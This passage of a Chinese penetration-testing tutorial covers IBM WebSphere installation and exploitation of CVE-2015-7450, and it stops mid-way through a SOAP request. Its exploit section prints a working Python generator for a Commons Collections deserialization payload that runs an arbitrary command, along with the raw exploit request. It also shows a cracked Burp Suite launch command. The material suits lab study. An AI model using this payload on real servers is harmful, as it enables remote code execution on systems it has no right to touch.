## 系列文章

> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)

## 简介

 **渗透测试-地基篇**

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

 **请注意** ：

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

名言：

你对这行的兴趣，决定你在这行的成就！

## 一、前言

中间件是介于应用系统和系统软件之间的一类软件，它使用系统软件所提供的基础服务（功能），衔接网络上应用系统的各个部分或不同的应用，能够达到资源共享、功能共享的目的。

可想而知中间件连接着网络和系统接触着越来越多的关键数据，渐渐成为单位公共安全中最具有战略性的资产，中间件的安全稳定运行也直接决定着业务系统能否正常使用。并且平台的中间件中往往连接数据库，而数据库储存着等极其重要和敏感的信息。如果中间件被攻破，这些信息一旦被篡改或者泄露，轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。所以对数据库的保护是一项必须的，关键的，重要的工作任务。

通过前几期钓鱼、内网攻防篇章落幕后，引来了服务攻防篇章之数据库渗透篇，不管在外网还是内网环境，只要存在业务系统都存在数据库，在渗透测试对数据库的知识学习是必不可少的，接下来将介绍数据库的渗透基本操作，带小伙伴们了解和学习数据库如何渗透的！

今天会讲解到学习WebSphere简介、WebSphere详细安装、Docker详细安装WebSphere7、Java反序列化(CVE-2015-7450）、弱口令
&&
后台Getshell、实战WebSphere经验等等，最后远程代码执行控制服务器等操作，如果连WebSphere都不会安装操作提权等，怎么进行下一步的研究WebSphere安全！怎么拿下对方服务器？

## 二、WebSphere简介

 **WebSphere 是什么？**

WebSphere 为 SOA
（面向服务的架构）环境提供软件，以实现动态的、互联的业务流程，为所有业务情形提供高度有效的应用程序基础架构。WebSphere 是 IBM
的应用程序和集成软件平台，包含所有必要的中间件基础架构（包括服务器、服务和工具），这些基础架构是创建、部署、运行和持续监视企业级 Web
应用程序和跨平台、跨产品的解决方案所必需的。与WAS6，WAS7相比较而言
WAS8发生了很大的改变，其安装介质和以前截然不同；并且官网已经明确说明：版本1.7.4.7及更早版本已被1.8.x和1.9.x版本取代。所有1.8之前版本的用户应将其系统升级到上述版本之一。

WebSphere® Application Server
加速交付新应用程序和服务，它可以通过快速交付创新的应用程序来帮助企业提供丰富的用户体验。从基于开放标准的丰富的编程模型中进行选择，以便更好地协调项目需求与编程模型功能和开发人员技能。

 **指纹:**

    
    
    Server: WebSphere Application Server/7.0
    

**登录页面：**

    
    
    http://127.0.0.1:9060/ibm/console/logon.jsp
    https://127.0.0.1:9043/ibm/console/logon.jsp
    

## 三、WebSphere详细安装

### 1、下载WebSphere

1）下载地址：

    
    
    http://www-01.ibm.com/support/docview.wss?uid=swg27004980
    https://www-01.ibm.com/support/docview.wss?uid=swg27025142#ibm-content
    

下载的时候需要注册下账号密码！

2）注册完后进入，进入之后选择版本：  
![1633610696_615eebc8d9b5fa0bc7a31.png!small?1633610698490](https://image.3001.net/images/20211007/1633610696_615eebc8d9b5fa0bc7a31.png!small?1633610698490)

![1633610702_615eebce047f5268baa4e.png!small?1633610702944](https://image.3001.net/images/20211007/1633610702_615eebce047f5268baa4e.png!small?1633610702944)

![1633610708_615eebd47bc481fc8a490.png!small?1633610710102](https://image.3001.net/images/20211007/1633610708_615eebd47bc481fc8a490.png!small?1633610710102)

3）需要下载文件进行连接下载：

![1633610713_615eebd9352097fd05b97.png!small?1633610714023](https://image.3001.net/images/20211007/1633610713_615eebd9352097fd05b97.png!small?1633610714023)

4）下载安装工具  
![1633610716_615eebdcd6f8dd9360f98.png!small?1633610717711](https://image.3001.net/images/20211007/1633610716_615eebdcd6f8dd9360f98.png!small?1633610717711)需要JDK8的版本支撑！

![1633610721_615eebe15afd0e3d9b655.png!small?1633610722113](https://image.3001.net/images/20211007/1633610721_615eebe15afd0e3d9b655.png!small?1633610722113)

5）直接运行下载  
![1633610727_615eebe7633d4307a3387.png!small?1633610727927](https://image.3001.net/images/20211007/1633610727_615eebe7633d4307a3387.png!small?1633610727927)

![1633610731_615eebeb7d9d2cbd63d05.png!small?1633610733610](https://image.3001.net/images/20211007/1633610731_615eebeb7d9d2cbd63d05.png!small?1633610733610)一定需要挂在V2等才可以下载！！

6）下载完成之后解压  
![1633610736_615eebf02f70c31f6d616.png!small?1633610739829](https://image.3001.net/images/20211007/1633610736_615eebf02f70c31f6d616.png!small?1633610739829)

### 2、安装WebSphere

1）双击install.exe  
![1633610740_615eebf4ac4560310ba7f.png!small?1633610746928](https://image.3001.net/images/20211007/1633610740_615eebf4ac4560310ba7f.png!small?1633610746928)

2）下一步

![1633610743_615eebf7e38e2147639ca.png!small?1633610746928](https://image.3001.net/images/20211007/1633610743_615eebf7e38e2147639ca.png!small?1633610746928)

3）接受，下一步  
![1633610747_615eebfb64c84376f700d.png!small?1633610751608](https://image.3001.net/images/20211007/1633610747_615eebfb64c84376f700d.png!small?1633610751608)

4）选择安装目录（最好自定义）  
![1633610752_615eec0036e121400af12.png!small?1633610753857](https://image.3001.net/images/20211007/1633610752_615eec0036e121400af12.png!small?1633610753857)

5）选择安装

![1633610755_615eec039a27e0ea7103c.png!small?1633610758024](https://image.3001.net/images/20211007/1633610755_615eec039a27e0ea7103c.png!small?1633610758024)![1633610761_615eec0958b51724996a6.png!small?1633610764673](https://image.3001.net/images/20211007/1633610761_615eec0958b51724996a6.png!small?1633610764673)

注意，安装过程需要下载一些东西，所以保持计算机处于联网状态!

6）选择重新启动

![1633610765_615eec0d1ffba2521380c.png!small?1633610767682](https://image.3001.net/images/20211007/1633610765_615eec0d1ffba2521380c.png!small?1633610767682)

### 3、下载WAS

1）直接去官网搜做

    
    
    http://www.ibm.com/en-us/homepage-a.html
    

搜索：

    
    
    Websphere Application Server for Developers
    

![1633610770_615eec12b7da1005fd867.png!small?1633610772187](https://image.3001.net/images/20211007/1633610770_615eec12b7da1005fd867.png!small?1633610772187)

2）选择下载  
![1633610774_615eec16400af353ca748.png!small?1633610776795](https://image.3001.net/images/20211007/1633610774_615eec16400af353ca748.png!small?1633610776795)

3）下载即可  
![1633610777_615eec19ad957a88bc8d8.png!small?1633610779662](https://image.3001.net/images/20211007/1633610777_615eec19ad957a88bc8d8.png!small?1633610779662)

![1633610781_615eec1d682cedb987842.png!small?1633610783350](https://image.3001.net/images/20211007/1633610781_615eec1d682cedb987842.png!small?1633610783350)

![1633610785_615eec21bc94c07457a82.png!small?1633610787342](https://image.3001.net/images/20211007/1633610785_615eec21bc94c07457a82.png!small?1633610787342)

4）下载完后：  
![1633610791_615eec2795016adc214e4.png!small?1633610791760](https://image.3001.net/images/20211007/1633610791_615eec2795016adc214e4.png!small?1633610791760)

5）解压完后：  
![1633610795_615eec2b3830cd1284371.png!small?1633610797379](https://image.3001.net/images/20211007/1633610795_615eec2b3830cd1284371.png!small?1633610797379)

### 4、安装WAS

1）运行IBM  
![1633610798_615eec2ed876b83cccb79.png!small?1633610798997](https://image.3001.net/images/20211007/1633610798_615eec2ed876b83cccb79.png!small?1633610798997)

2）打开首选项  
![1633610803_615eec3365d8bc7c4e25a.png!small?1633610804649](https://image.3001.net/images/20211007/1633610803_615eec3365d8bc7c4e25a.png!small?1633610804649)

3）选择添加存储库-浏览  
![1633610811_615eec3b0c1322dfc3ffa.png!small?1633610813042](https://image.3001.net/images/20211007/1633610811_615eec3b0c1322dfc3ffa.png!small?1633610813042)

4）选择我们上面下载的解压之后的目录下面的.config文件  
![1633610817_615eec4133cdd4a06f961.png!small?1633610818985](https://image.3001.net/images/20211007/1633610817_615eec4133cdd4a06f961.png!small?1633610818985)

![1633610821_615eec4514ea117199607.png!small?1633610821442](https://image.3001.net/images/20211007/1633610821_615eec4514ea117199607.png!small?1633610821442)

5）默认下一步  
![1633610825_615eec493d5d033ef7aab.png!small?1633610827689](https://image.3001.net/images/20211007/1633610825_615eec493d5d033ef7aab.png!small?1633610827689)

6）默认下一步![1633610829_615eec4d58f10045f7306.png!small?1633610831990](https://image.3001.net/images/20211007/1633610829_615eec4d58f10045f7306.png!small?1633610831990)

7）目录修改下  
![1633610833_615eec51a5967691fd446.png!small?1633610835779](https://image.3001.net/images/20211007/1633610833_615eec51a5967691fd446.png!small?1633610835779)

8）默认下一步  
![1633610837_615eec55769c16be2bd5a.png!small?1633610839772](https://image.3001.net/images/20211007/1633610837_615eec55769c16be2bd5a.png!small?1633610839772)

9）选择中文下一步  
![1633610840_615eec58e61c5d30cc727.png!small?1633610842230](https://image.3001.net/images/20211007/1633610840_615eec58e61c5d30cc727.png!small?1633610842230)

10）默认下一步  
![1633610845_615eec5d20a803f3806d8.png!small?1633610847862](https://image.3001.net/images/20211007/1633610845_615eec5d20a803f3806d8.png!small?1633610847862)

11）默认下一步  
![1633610848_615eec60ccc5b42fcba90.png!small?1633610851139](https://image.3001.net/images/20211007/1633610848_615eec60ccc5b42fcba90.png!small?1633610851139)

12）等待安装，预计2分钟  
![1633610853_615eec6570b2eb91d8a40.png!small?1633610855645](https://image.3001.net/images/20211007/1633610853_615eec6570b2eb91d8a40.png!small?1633610855645)

13）默认概要管理也可以选择无-下一步  
![1633610857_615eec6958ac3bda0c145.png!small?1633610859400](https://image.3001.net/images/20211007/1633610857_615eec6958ac3bda0c145.png!small?1633610859400)

### 5、添加Server

1）选择创建  
![1633610861_615eec6d8519b497d8686.png!small?1633610862403](https://image.3001.net/images/20211007/1633610861_615eec6d8519b497d8686.png!small?1633610862403)

2）选择应用服务器  
![1633610865_615eec71accb41c4c076a.png!small?1633610868446](https://image.3001.net/images/20211007/1633610865_615eec71accb41c4c076a.png!small?1633610868446)

3）选择高级概要文件创建  
![1633610869_615eec75eabbf3492a794.png!small?1633610872644](https://image.3001.net/images/20211007/1633610869_615eec75eabbf3492a794.png!small?1633610872644)

4）默认下一步  
![1633610877_615eec7dc60f67831c59e.png!small?1633610880222](https://image.3001.net/images/20211007/1633610877_615eec7dc60f67831c59e.png!small?1633610880222)

5）默认下一步  
![1633610882_615eec821033d6b496f35.png!small?1633610884010](https://image.3001.net/images/20211007/1633610882_615eec821033d6b496f35.png!small?1633610884010)

    
    
    C:\Program Files (x86)\IBM\WebSphere\AppServer\profiles\AppSrv01
    

6）默认下一步  
![1633610886_615eec86bf737009a212d.png!small?1633610889028](https://image.3001.net/images/20211007/1633610886_615eec86bf737009a212d.png!small?1633610889028)这里要注意【主机名】的配置
为本机计算机名次 （保证能Ping通） 在实际生产中配置服务器的IP地址！

7）填写用户名密码  
![1633610897_615eec91b2e6eaf59dbfb.png!small?1633610899166](https://image.3001.net/images/20211007/1633610897_615eec91b2e6eaf59dbfb.png!small?1633610899166)dayuadmin/admin123

8）默认下一步  
![1633610903_615eec972683a46be02b4.png!small?1633610904979](https://image.3001.net/images/20211007/1633610903_615eec972683a46be02b4.png!small?1633610904979)

9）默认下一步  
![1633610909_615eec9d5bb0956eee602.png!small?1633610911353](https://image.3001.net/images/20211007/1633610909_615eec9d5bb0956eee602.png!small?1633610911353)

10）默认下一步  
![1633610914_615eeca24e9b5e89a832d.png!small?1633610916985](https://image.3001.net/images/20211007/1633610914_615eeca24e9b5e89a832d.png!small?1633610916985)默认端口信息，注意我圈红圈的信息，以后需要用到！！

11）取消勾选  
![1633610922_615eecaac3fb234fff039.png!small?1633610924460](https://image.3001.net/images/20211007/1633610922_615eecaac3fb234fff039.png!small?1633610924460)

12）默认下一步  
![1633610926_615eecaede0c521804753.png!small?1633610928248](https://image.3001.net/images/20211007/1633610926_615eecaede0c521804753.png!small?1633610928248)

13）默认下一步  
![1633610936_615eecb848e4ee2574abc.png!small?1633610938283](https://image.3001.net/images/20211007/1633610936_615eecb848e4ee2574abc.png!small?1633610938283)

14）取消勾选，然后完成  
![1633610941_615eecbde14e5ff614f08.png!small?1633610943711](https://image.3001.net/images/20211007/1633610941_615eecbde14e5ff614f08.png!small?1633610943711)

15）成功创建AppSrv01应用服务器  
![1633610950_615eecc63e69ca4c51d15.png!small?1633610950776](https://image.3001.net/images/20211007/1633610950_615eecc63e69ca4c51d15.png!small?1633610950776)  
至此概要文件配置完成！

16）概要文件配置完成以后其目录结构如下：  
![1633610954_615eeccadd845d407e758.png!small?1633610958149](https://image.3001.net/images/20211007/1633610954_615eeccadd845d407e758.png!small?1633610958149)

    
    
    C:\Program Files (x86)\IBM\WebSphere\AppServer
    

### 6、运行WAS

1）管理员模式运行cmd

![1633610961_615eecd18420d0c938f82.png!small?1633610962775](https://image.3001.net/images/20211007/1633610961_615eecd18420d0c938f82.png!small?1633610962775)

    
    
    cd C:\Program Files (x86)\IBM\WebSphere\AppServer\bin
    startServer -help
    

命令行进入概要文件目录下的bin目录，执行 startServer -help
查看该命令对应的帮助（其他命令的用法也可通过同样的操作得到）可能要等一会才会显示！

2）执行命令启动WAS

    
    
    startServer server1 -profileName AppSrv01
    

![1633610967_615eecd71cb6283f40369.png!small?1633610968081](https://image.3001.net/images/20211007/1633610967_615eecd71cb6283f40369.png!small?1633610968081)

表示WAS成功启动 （可通过stopServer+【服务名】命令来停止）

3）打开浏览器输入

    
    
    http://localhost:9060/ibm/console
    

![1633610972_615eecdc4ca2306d7d00e.png!small?1633610973202](https://image.3001.net/images/20211007/1633610972_615eecdc4ca2306d7d00e.png!small?1633610973202)

![1633610976_615eece038e3aebbbe428.png!small?1633610979114](https://image.3001.net/images/20211007/1633610976_615eece038e3aebbbe428.png!small?1633610979114)成功访问！![1633610979_615eece3e417bf93a9128.png!small?1633610982008](https://image.3001.net/images/20211007/1633610979_615eece3e417bf93a9128.png!small?1633610982008)

至此，WebSphere Application Server的下载以及安装就算完成了！！

## 四、Docker详细安装WebSphere7版本

### 1、使用docker搭建环境

1）查看docker环境中websphere7有哪些  
![1633610983_615eece7abd384b1049a7.png!small?1633610984057](https://image.3001.net/images/20211007/1633610983_615eece7abd384b1049a7.png!small?1633610984057)

    
    
    docker search WebSphere7
    

2）下载docker  
![1633610987_615eecebdbfa9b5ad4bf3.png!small?1633610989689](https://image.3001.net/images/20211007/1633610987_615eecebdbfa9b5ad4bf3.png!small?1633610989689)![1633610991_615eecef4b60ad8f029d7.png!small?1633610992760](https://image.3001.net/images/20211007/1633610991_615eecef4b60ad8f029d7.png!small?1633610992760)

    
    
    docker pull iscrosales/websphere7
    

3）开启docker的websphere7  
![1633610995_615eecf3186cecd9d9d29.png!small?1633610996457](https://image.3001.net/images/20211007/1633610995_615eecf3186cecd9d9d29.png!small?1633610996457)

    
    
    docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7
    

![1633610998_615eecf6a995b36d3a0fb.png!small?1633611000745](https://image.3001.net/images/20211007/1633610998_615eecf6a995b36d3a0fb.png!small?1633611000745)

成功开启docker环境运行的websphere7环境！

## 五、WebSphere渗透总结

### 1、Java反序列化(CVE-2015-7450）

CVEID： CVE-2015-7450  
说明：由于使用Java InvokerTransformer类对数据进行反序列化，Apache Commons
Collections可能允许远程攻击者在系统上执行任意代码。通过发送特制数据，攻击者可以利用此漏洞在系统上执行任意Java代码。  
CVSS基本分数：9.8  
CVSS时间分数：有关当前分数，请参见https://exchange.xforce.ibmcloud.com/vulnerabilities/107918  
CVSS环境分数*：未定义  
CVSS向量：（CVSS：3.0 / AV：N / AC：L / PR：N / UI：N / S：U / C：H / I：H / A：H）

以下版本的WebSphere Application Server和IBM WebSphere Application Server Hypervisor
Edition可能会受到影响：

    
    
    版本8.5和8.5.5传统和自由
    8.0版
    7.0版
    

#### 1）漏洞验证

该反序列化漏洞发生位置在SOAP的通信端口8880，使用https发送XML格式数据。如果访问8880端口出现如下界面，则可能存在Java反序列化漏洞！！

    
    
    http://192.168.253.9:8880/
    

![1633611004_615eecfc6a18988476c49.png!small?1633611007093](https://image.3001.net/images/20211007/1633611004_615eecfc6a18988476c49.png!small?1633611007093)

#### 2）win安装Burpsuite

（1）安装JDK8即可！

（2）开始运行激活  
![1633611008_615eed0085f7bd13ff8a8.png!small?1633611011498](https://image.3001.net/images/20211007/1633611008_615eed0085f7bd13ff8a8.png!small?1633611011498)

    
    
    java -Dfile.encoding=utf-8 -javaagent:BurpSuiteCn.jar -Xbootclasspath/p:burp-loader-keygen.jar  -Xmx1024m -jar burpsuite_pro_v2.0.11.jar
    

![1633611012_615eed04d853cb6d995ce.png!small?1633611016519](https://image.3001.net/images/20211007/1633611012_615eed04d853cb6d995ce.png!small?1633611016519)

![1633611017_615eed097c7dcb2eebe4c.png!small](https://image.3001.net/images/20211007/1633611017_615eed097c7dcb2eebe4c.png!small)

![1633611021_615eed0d5b293e78fd7e2.png!small](https://image.3001.net/images/20211007/1633611021_615eed0d5b293e78fd7e2.png!small)成功激活！

（3）设置全局代理  
![1633611027_615eed13d8a0b010ee52c.png!small?1633611028393](https://image.3001.net/images/20211007/1633611027_615eed13d8a0b010ee52c.png!small?1633611028393)

#### 3）本地复现漏洞

（1）通过访问发现xml的回显，回显内容将构造的执行命令的payload通过base64编码后放在objectname节点中，通过https发送到服务器端，服务器端调用相应的执行函数，将结果发送给客户端，同样返回的数据也是经过base64编码的。

    
    
    import base64
    from binascii import unhexlify
     
    command = "执行的命令"
    serObj = unhexlify("ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400")
    serObj += (chr(len(command)) + command).encode('ascii')
    serObj += unhexlify("740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A")
    serObjB64 = base64.b64encode(serObj).decode()
    print(serObjB64)
    

![1633611042_615eed2244ac2fb08e3b0.png!small?1633611054606](https://image.3001.net/images/20211007/1633611042_615eed2244ac2fb08e3b0.png!small?1633611054606)

（2）然后将输出的serObjB64，替换到如下数据包中的params节点，发送数据包即可执行：

    
    
    POST / HTTP/1.1
    Host: 192.168.31.12:8880
    User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Connection: close
    Content-Type: text/xml
    SOAPAction: urn:AdminService
    Content-Length: 8886
     
    <?xml version='1.0' encoding='UTF-8'?>
    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
    <SOAP-ENV:Header ns0:JMXConnectorContext="rO0ABXNyAA9qYXZhLnV0aWwuU3RhY2sQ/irCuwmGHQIAAHhyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKc3IAOmNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3IuSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnTblRMyYyF8sQIABUwACGNlbGxOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAIaG9zdE5hbWVxAH4AB0wACG5vZGVOYW1lcQB+AAdMAApzZXJ2ZXJOYW1lcQB+AAdbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7eHB0AAB0AAhMYXAzOTAxM3EAfgAKcQB+AAp1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAACpzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4AB0wACGZpbGVOYW1lcQB+AAdMAAptZXRob2ROYW1lcQB+AAd4cAAAAEt0ADpjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHRFbGVtZW50dAAfSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnQuamF2YXQABjxpbml0PnNxAH4ADgAAADx0ADNjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHR0ABhKTVhDb25uZWN0b3JDb250ZXh0LmphdmF0AARwdXNoc3EAfgAOAAAGQ3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAcZ2V0Sk1YQ29ubmVjdG9yQ29udGV4dEhlYWRlcnNxAH4ADgAAA0h0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQAEmludm9rZVRlbXBsYXRlT25jZXNxAH4ADgAAArF0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQADmludm9rZVRlbXBsYXRlc3EAfgAOAAACp3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAOaW52b2tlVGVtcGxhdGVzcQB+AA4AAAKZdAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA4AAAHndAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA7/dAAVY29tLnN1bi5wcm94eS4kUHJveHkwcHQABmludm9rZXNxAH4ADgAAAOB0ACVjb20uaWJtLndzLm1hbmFnZW1lbnQuQWRtaW5DbGllbnRJbXBsdAAUQWRtaW5DbGllbnRJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAADYdAA9Y29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5jb25maWdzZXJ2aWNlLkNvbmZpZ1NlcnZpY2VQcm94eXQAF0NvbmZpZ1NlcnZpY2VQcm94eS5qYXZhdAARZ2V0VW5zYXZlZENoYW5nZXNzcQB+AA4AAAwYdAAmY29tLmlibS53cy5zY3JpcHRpbmcuQWRtaW5Db25maWdDbGllbnR0ABZBZG1pbkNvbmZpZ0NsaWVudC5qYXZhdAAKaGFzQ2hhbmdlc3NxAH4ADgAAA/Z0AB5jb20uaWJtLndzLnNjcmlwdGluZy5XYXN4U2hlbGx0AA5XYXN4U2hlbGwuamF2YXQACHRpbWVUb0dvc3EAfgAOAAAFm3QAImNvbS5pYm0ud3Muc2NyaXB0aW5nLkFic3RyYWN0U2hlbGx0ABJBYnN0cmFjdFNoZWxsLmphdmF0AAtpbnRlcmFjdGl2ZXNxAH4ADgAACPp0ACJjb20uaWJtLndzLnNjcmlwdGluZy5BYnN0cmFjdFNoZWxsdAASQWJzdHJhY3RTaGVsbC5qYXZhdAADcnVuc3EAfgAOAAAElHQAHmNvbS5pYm0ud3Muc2NyaXB0aW5nLldhc3hTaGVsbHQADldhc3hTaGVsbC5qYXZhdAAEbWFpbnNxAH4ADv50ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQAB2ludm9rZTBzcQB+AA4AAAA8dAAkc3VuLnJlZmxlY3QuTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsdAAdTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAAAldAAoc3VuLnJlZmxlY3QuRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbHQAIURlbGVnYXRpbmdNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAAmN0ABhqYXZhLmxhbmcucmVmbGVjdC5NZXRob2R0AAtNZXRob2QuamF2YXQABmludm9rZXNxAH4ADgAAAOp0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAKbGF1bmNoTWFpbnNxAH4ADgAAAGB0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAEbWFpbnNxAH4ADgAAAE10ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAADcnVuc3EAfgAO/nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAACS3QANG9yZy5lY2xpcHNlLmVxdWlub3guaW50ZXJuYWwuYXBwLkVjbGlwc2VBcHBDb250YWluZXJ0ABhFY2xpcHNlQXBwQ29udGFpbmVyLmphdmF0ABdjYWxsTWV0aG9kV2l0aEV4Y2VwdGlvbnNxAH4ADgAAAMZ0ADFvcmcuZWNsaXBzZS5lcXVpbm94LmludGVybmFsLmFwcC5FY2xpcHNlQXBwSGFuZGxldAAVRWNsaXBzZUFwcEhhbmRsZS5qYXZhdAADcnVuc3EAfgAOAAAAbnQAPG9yZy5lY2xpcHNlLmNvcmUucnVudGltZS5pbnRlcm5hbC5hZGFwdG9yLkVjbGlwc2VBcHBMYXVuY2hlcnQAF0VjbGlwc2VBcHBMYXVuY2hlci5qYXZhdAAOcnVuQXBwbGljYXRpb25zcQB+AA4AAABPdAA8b3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmlud